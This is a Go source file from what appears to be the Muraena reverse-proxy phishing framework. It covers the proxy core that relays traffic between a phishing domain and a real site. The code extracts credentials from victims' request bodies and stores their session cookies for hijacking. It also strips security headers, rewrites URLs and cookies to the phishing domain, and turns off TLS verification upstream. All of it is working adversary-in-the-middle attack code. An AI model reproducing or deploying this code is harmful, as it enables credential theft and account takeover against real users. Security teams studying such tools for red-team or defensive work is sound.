package proxy

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"

	"github.com/evilsocket/islazy/tui"
	. "github.com/logrusorgru/aurora"
	"github.com/muraenateam/muraena/core"
	"github.com/pkg/errors"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module/statichttp"
	"github.com/muraenateam/muraena/module/tracking"
	"github.com/muraenateam/muraena/session"
)

type MuraenaProxyInit struct {
	Session  *session.Session
	Replacer *Replacer

	Origin string // proxy origin (phishing site)
	Target string // proxy destination (real site)
}

type MuraenaProxy struct {
	Session *session.Session

	Origin       string   // proxy origin (phishing site)
	Target       *url.URL // proxy destination (real site)
	Victim       string   // UUID
	ReverseProxy *ReverseProxy
	Tracker      *tracking.Tracker
	Replacer     *Replacer
}

type SessionType struct {
	Session  *session.Session
	Replacer *Replacer
}

func RedirectToHTTPS(port int) http.HandlerFunc {

	return func(w http.ResponseWriter, req *http.Request) {

		var re = regexp.MustCompile(`(:\d+)$`)
		host := re.ReplaceAllString(req.Host, "")

		newURL := fmt.Sprintf("https://%s%s", host, req.URL.String())
		if port != 443 {
			newURL = fmt.Sprintf("https://%s:%d%s", host, port, req.URL.String())
		}

		log.Info("Redirecting HTTP to HTTPS: %s", newURL)
		http.Redirect(w, req, newURL, http.StatusMovedPermanently)
	}
}

func (muraena *MuraenaProxy) RequestBodyProcessor(request *http.Request, track *tracking.Trace, base64 Base64) (err error) {
	if request.Body != nil {

		// Replacer object
		replacer := muraena.Replacer

		r := request.Body
		buf, err := ioutil.ReadAll(r)
		if err != nil {
			log.Error("%s", err)
			return err
		}
		err = request.Body.Close()
		if err != nil {
			log.Error("%s", err)
			return err
		}

		// defer r.Close()
		defer func() {
			if err = r.Close(); err != nil {
				log.Error("Error in r.Close(): %+v", err)
			}
		}()

		bodyString := string(buf)

		// Trace credentials
		if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
			found, err := track.ExtractCredentials(bodyString, request)
			if err != nil {
				return errors.New(fmt.Sprintf("ExtractCredentials error: %s", err))
			}

			if found == true {
				muraena.Tracker.ShowVictims()
			}
		}

		transform := replacer.Transform(bodyString, true, base64)
		request.Body = ioutil.NopCloser(bytes.NewReader([]byte(transform)))
		request.ContentLength = int64(len(transform))
		request.Header.Set("Content-Length", strconv.Itoa(len(transform)))
	}
	return
}

func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error) {

	sess := muraena.Session
	base64 := Base64{
		sess.Config.Transform.Base64.Enabled,
		sess.Config.Transform.Base64.Padding,
	}

	// Replacer object
	replacer := muraena.Replacer

	//
	// TRACKING
	track := muraena.Tracker.TrackRequest(request)

	// DROP
	dropRequest := false
	for _, drop := range sess.Config.Drop {
		if request.URL.Path == drop.Path {
			dropRequest = true
			break
		}
	}

	if dropRequest {
		log.Debug("[Dropped] %s", request.URL.Path)
		return
	}

	//
	// Garbage ..
	//
	// no garbage to remove in requests, for now ..

	//
	// HEADERS
	//
	// Transform query string using internal core.url instead of net.url
	query, err := core.ParseQuery(request.URL.RawQuery)
	if err != nil {
		log.Error("URL: %s \n %s", request.URL, err.Error())
	}

	for pKey := range query {
		for k, v := range query[pKey] {
			query[pKey][k] = replacer.Transform(v, true, base64)
		}
	}

	// Remove headers
	for _, header := range sess.Config.Remove.Request.Headers {
		request.Header.Del(header)
	}

	// Transform HTTP headers of interest
	request.Host = muraena.Target.Host
	for _, header := range sess.Config.Transform.Request.Headers {
		if request.Header.Get(header) != "" {
			hURL, err := replacer.transformUrl(request.Header.Get(header), base64)
			if err != nil {
				log.Warning("Error transforming request URL:\n%+v", err)
				continue
			}

			if request.Header.Get(header) != hURL {
				request.Header.Set(header, hURL)
				log.Debug("Patched HTTP %s to %s", tui.Bold(tui.Red(header)), tui.Bold(tui.Red(request.Header.Get(header))))
			}
		}
	}

	lhead := fmt.Sprintf("[%s]", request.RemoteAddr)
	if sess.Config.Tracking.Enabled {
		lhead = fmt.Sprintf("[%s]%s", track.ID, lhead)
	}

	// Add extra HTTP headers
	for _, header := range sess.Config.Craft.Add.Request.Headers {
		request.Header.Set(header.Name, header.Value)
	}

	l := fmt.Sprintf("%s - [%s][%s%s(%s)%s]", lhead,
		Magenta(request.Method), Magenta(sess.Config.Protocol), Green(muraena.Origin),
		Yellow(muraena.Target), Cyan(request.URL.Path))
	log.Info(l)

	//
	// BODY
	//

	// If the requested resource extension is no relevant, skip body processing.
	for _, extension := range sess.Config.SkipExtensions {
		if strings.HasSuffix(request.URL.Path, fmt.Sprintf(".%s", extension)) {
			return
		}
	}

	if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
		log.Debug("Going to hijack session: %s (Track: %+v)", request.URL.Path, track)
		err = track.HijackSession(request)
		if err != nil {
			log.Debug("Error Hijacking Session: %s", err)
			return nil
		}
	}

	// Transform body
	err = muraena.RequestBodyProcessor(request, track, base64)
	if err != nil {
		return
	}

	return nil
}

func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err error) {

	sess := muraena.Session
	base64 := Base64{
		sess.Config.Transform.Base64.Enabled,
		sess.Config.Transform.Base64.Padding,
	}

	if response.Request.Header.Get(muraena.Tracker.Landing) != "" {
		response.StatusCode = 302
		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
		response.Header.Add("Set-Cookie",
			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
				muraena.Session.Config.Proxy.Phishing))
		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.Landing))
		return
	}

	// Replacer object
	replacer := muraena.Replacer

	//
	// Garbage ..
	//

	// DROP
	dropRequest := false
	for _, drop := range sess.Config.Drop {
		if response.Request.URL.Path == drop.Path && drop.RedirectTo != "" {
			// if the response was for the dropped request
			response.StatusCode = 302
			response.Header.Set("Location", drop.RedirectTo)
			log.Info("Dropped request %s redirected to: %s", drop.Path, drop.RedirectTo)
			dropRequest = true
			break
		}
	}
	if dropRequest {
		return
	}

	// Add extra HTTP headers
	for _, header := range sess.Config.Craft.Add.Response.Headers {
		response.Header.Set(header.Name, header.Value)
	}

	// Media Type handling.
	// Prevent processing of unwanted media types
	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
	for _, skip := range sess.Config.Transform.SkipContentType {

		skip = strings.ToLower(skip)

		if mediaType == skip {
			return
		}

		if strings.HasSuffix(skip, "/*") &&
			strings.Split(mediaType, "/")[0] == strings.Split(skip, "/*")[0] {
			return
		}
	}

	//
	// Trace
	//
	victim := muraena.Tracker.TrackResponse(response)
	if victim != nil {
		// before transforming headers like cookies, store the cookies in the CookieJar
		for _, c := range response.Cookies() {
			if c.Domain == "" {
				c.Domain = response.Request.Host
			}

			sessCookie := db.VictimCookie{
				Name:     c.Name,
				Value:    c.Value,
				Domain:   c.Domain,
				Expires:  c.Expires.String(), // will be set by necrobrowser
				Path:     c.Path,
				HTTPOnly: c.HttpOnly,
				Secure:   c.Secure,
			}

			muraena.Tracker.PushCookie(victim, sessCookie)
		}
	} else {
		if len(response.Cookies()) > 0 {
			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
		}
	}

	//
	// HEADERS
	//
	// delete security headers
	for _, header := range sess.Config.Remove.Response.Headers {
		response.Header.Del(header)
	}

	// transform headers of interest
	for _, header := range sess.Config.Transform.Response.Headers {
		if response.Header.Get(header) != "" {
			if header == "Set-Cookie" {
				for k, value := range response.Header["Set-Cookie"] {
					response.Header["Set-Cookie"][k] = replacer.Transform(value, false, base64)
				}
			} else {
				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
			}
		}
	}

	//
	// BODY
	//
	// unpack response body
	modResponse := Response{Response: response}
	responseBuffer, err := modResponse.Unpack()
	if err != nil {
		log.Info("Error reading/deflating response: %+v", err)
		return err
	}

	// process body and pack again
	err = modResponse.Pack([]byte(replacer.Transform(string(responseBuffer), false, base64)))
	if err != nil {
		log.Info("Error processing the body: %+v", err)
		return err
	}

	return nil
}

func (muraena *MuraenaProxy) ProxyErrHandler(response http.ResponseWriter, request *http.Request, err error) {
	log.Error("[errHandler] \n\t%+v \n\t in request %s %s%s", err, request.Method, request.Host, request.URL.Path)
}

func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
	sess := init.Session

	destination, err := url.Parse(init.Target)
	if err != nil {
		log.Info("Error parsing destination URL: %s", err)
	}

	muraena := &MuraenaProxy{
		Session:      sess,
		Origin:       init.Origin,
		Target:       destination,
		ReverseProxy: NewSingleHostReverseProxy(destination),
		Replacer:     init.Replacer,
	}

	m, err := sess.Module("tracker")
	if err != nil {
		log.Error("%s", err)
	}

	tracker, ok := m.(*tracking.Tracker)
	if ok {
		muraena.Tracker = tracker
	}

	proxy := muraena.ReverseProxy

	director := proxy.Director
	proxy.Director = func(r *http.Request) {
		if err = muraena.RequestProcessor(r); err != nil {
			log.Error(err.Error())
			return
		}
		director(r)
	}
	proxy.ModifyResponse = muraena.ResponseProcessor
	proxy.ErrorHandler = muraena.ProxyErrHandler
	proxy.Transport = &http.Transport{}

	if *sess.Options.Proxy {
		// If HTTP_PROXY or HTTPS_PROXY env variables are defined
		// all the proxy traffic will be forwarded to the defined proxy.
		// Basically a MiTM of the MiTM :)
		proxy.Transport = &http.Transport{
			Proxy:           http.ProxyFromEnvironment,
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	return muraena
}

func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {

	var destination string
	sess := st.Session
	replacer := st.Replacer

	if sess.Config.StaticServer.Enabled {
		m, err := sess.Module("static.http")
		if err != nil {
			log.Error("%s", err)
		}

		ss, ok := m.(*statichttp.StaticHTTP)
		if ok {
			destination = ss.MakeDestinationURL(request.URL)
		}
	}

	if destination == "" {
		if strings.HasPrefix(request.Host, replacer.ExternalOriginPrefix) { //external domain mapping
			for domain, subMapping := range replacer.OriginsMapping {

				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
				// This is specifically important since wildcard SSL certs do not handle N levels of nesting
				if subMapping == strings.Split(request.Host, ".")[0] {
					destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
						strings.Replace(request.Host,
							fmt.Sprintf("%s.%s", subMapping, replacer.Phishing),
							domain, -1))
					break
				}
			}
		} else {
			destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
				strings.Replace(request.Host, replacer.Phishing, replacer.Target, -1))
		}
	}

	// PortMapping
	if sess.Config.Proxy.PortMap != "" {

		destURL, err := url.Parse(destination)
		if err != nil {
			log.Error("%s", err)
		} else {

			port := destURL.Port()
			if port == "" && destURL.Scheme == "https" {
				port = "443"
				destination = fmt.Sprintf("%s:%s", destination, port)
			} else if port == "" && destURL.Scheme == "http" {
				port = "80"
				destination = fmt.Sprintf("%s:%s", destination, port)
			}

			if strings.HasPrefix(sess.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
				newport := strings.Split(sess.Config.Proxy.PortMap, ":")[1]
				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
			}
		}
	}

	if destination == "" {
		log.Error("Unexpected request at: %s", request.Host)
		return
	}

	muraena := &MuraenaProxyInit{
		Origin:   request.Host,
		Target:   destination,
		Session:  sess,
		Replacer: replacer,
	}

	muraenaProxy := muraena.Spawn()
	if muraenaProxy == nil {
		return
	}

	// The httputil ReverseProxy leaks some information via X-Forwarded-For header:
	// https://github.com/golang/go/blob/master/src/net/http/httputil/reverseproxy.go#L249
	//
	// Therefore, the actual version of reverseproxy.go used in this project
	// has been slightly modified in the ServeHTTP method:
	muraenaProxy.ReverseProxy.ServeHTTP(response, request)
}
